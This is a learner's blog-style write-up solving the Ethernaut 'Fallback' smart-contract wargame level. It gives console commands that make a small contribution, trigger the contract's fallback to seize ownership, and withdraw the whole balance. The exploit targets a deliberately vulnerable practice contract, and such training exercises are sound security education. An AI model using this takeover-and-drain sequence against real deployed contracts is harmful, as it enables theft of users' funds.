# Fallback Solution

I read through the instructions to ensure I have understood what I problem I
want to solve.

The problem is to beat this level by:

- claim ownership of the contract
- reduce its balance to 0

## My approach

To be honest I was lost for a moment, then I read through the contract to ensure
I understand what was going on in the contract.

After figuring out what the contract does...

I realized I had to make a contribution to be able to claim the ownership of the
contract.

This was achieved by issuing:

```solidity
await contract.contribute({from: player, value: toWei(0.0009)})
```

After making the contribution, the transaction was sent by running:

```solidity
sendTransaction({from: player, value: toWei(0.0009), to: instance, data: '0x9999'})
```

With this, the contract was claimed.

The next command was ran to withdraw all the balance of the current instance to
reduce it to 0:

```solidity
await contract.withdraw()
```

This was a really big test for my basics of Solidity and I am so excited about
this new journeey.

See you in the next level: _Fallout_

Catch ya!!!
